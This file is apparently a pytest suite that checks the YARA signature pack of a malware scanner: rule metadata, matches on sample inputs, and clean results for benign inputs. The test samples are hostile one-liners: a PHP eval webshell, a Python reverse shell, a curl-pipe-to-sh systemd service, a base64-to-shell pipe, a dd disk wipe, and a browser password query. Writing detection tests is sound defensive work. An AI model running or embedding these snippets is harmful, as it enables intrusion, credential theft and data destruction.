"""签名包契约测试：49 条 YARA 规则本身也要被检查。

为什么值得单独测
----------------
签名包是「数据」，不是代码，因此它不会在单元测试里被自动执行到。规则写错
（缺 meta、类别拼错、条件只在样本上成立）只会让线上扫描少一条检测，或者多
一条误报——两种情况都不会抛异常。这里把签名包的**契约**和**代表性正反例**
一起锁住。
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from engine.scanner_core import mappings, signatures, yara_lite  # noqa: E402


@pytest.fixture(scope="module")
def pack() -> yara_lite.SignaturePack:
    result, status = signatures.load_signature_pack(ROOT / "engine/rulesets/v1.2.0")
    assert result is not None, status
    assert not status["errors"], status["errors"]
    return result


def test_pack_is_present_and_reasonably_sized(pack):
    assert len(pack.rules) >= 40
    names = [rule.name for rule in pack.rules]
    assert len(names) == len(set(names)), "规则名重复会让指纹与报告难以对应"


def test_every_rule_declares_reviewable_metadata(pack):
    allowed_severity = {"critical", "high", "medium", "low"}
    allowed_confidence = {"high", "medium", "low"}
    for rule in pack.rules:
        meta = rule.meta
        assert meta.get("category") in mappings.CATEGORY_MAP, (
            f"{rule.name}: 未登记的 category {meta.get('category')!r}")
        assert meta.get("severity") in allowed_severity, f"{rule.name}: severity"
        assert meta.get("confidence") in allowed_confidence, f"{rule.name}: confidence"
        assert meta.get("description"), f"{rule.name}: 缺少 description"
        assert meta.get("sr"), f"{rule.name}: 缺少 SR 编号"
        # 签名规则不使用一票否决：它会绕过上下文降权，而 YARA 命中的上下文
        # 判断依赖与文本规则完全相同的降权层。
        assert not meta.get("hard_block"), f"{rule.name}: 不应声明 hard_block"


def test_rules_match_expected_samples(pack):
    samples = {
        "PHP_WebShell_Eval_Request": b"<?php eval($_POST['cmd']); ?>",
        "Python_Socket_Dup2_Shell":
            b"s=socket.socket(); s.connect(('1.2.3.4',1)); os.dup2(s.fileno(),0);"
            b" os.dup2(s.fileno(),1); pty.spawn('/bin/sh')",
        "Mining_Pool_Protocol": b"stratum+tcp://pool.example:3333",
        "XMRig_Config_Shape": b'{"algo":"rx/0","donate-level":0,"pool":"x"}',
        "Ransom_Note_Markers": b"YOUR FILES ARE ENCRYPTED. Pay 1 BTC.",
        "Disk_Wipe_Command": b"dd if=/dev/zero of=/dev/disk2 bs=1m",
        "Base64_Pipe_To_Shell": b"echo aGk= | base64 -d | sh",
        "Systemd_Service_Remote_Exec":
            b"[Service]\nExecStart=/bin/sh -c 'curl http://x/i.sh | sh'\n"
            b"# /etc/systemd/system/x.service",
        "Browser_Credential_Store_Theft":
            b"sqlite3 'Login Data' \"SELECT password_value FROM logins\"",
    }
    for rule_name, data in samples.items():
        matched = {rule.name for rule in pack.rules if rule.match(data) is not None}
        assert rule_name in matched, f"{rule_name} 未命中对应样本"


@pytest.mark.parametrize("data", [
    # 正常 HTTP 客户端：环境变量与请求同时出现，但不是「整份环境导出」。
    b"proxy = os.environ.get('HTTPS_PROXY')\nrequests.post(url, json=payload)\n",
    # 正常计划任务查看。
    b"crontab -l | grep backup\n",
    # 正常清理：find -delete 但没有 shred。
    b"find . -name '*.pyc' -delete\n",
    # 文档里提到危险串，但没有组合条件成立。
    b"Do not use /dev/tcp for production telemetry.\n",
])
def test_benign_samples_are_clean(pack, data):
    assert [rule.name for rule in pack.rules if rule.match(data) is not None] == []


def test_safe_skill_fixture_is_clean():
    # 端到端：语境正常的 Skill 不应产生任何签名命中。
    safe = ROOT / "tests/fixtures/legacy-samples/sample-safe-skill"
    result = signatures.scan_signatures(safe, {}, ROOT / "engine/rulesets/v1.2.0")
    assert result["findings"] == []
    assert result["status"]["status"] == "OK"
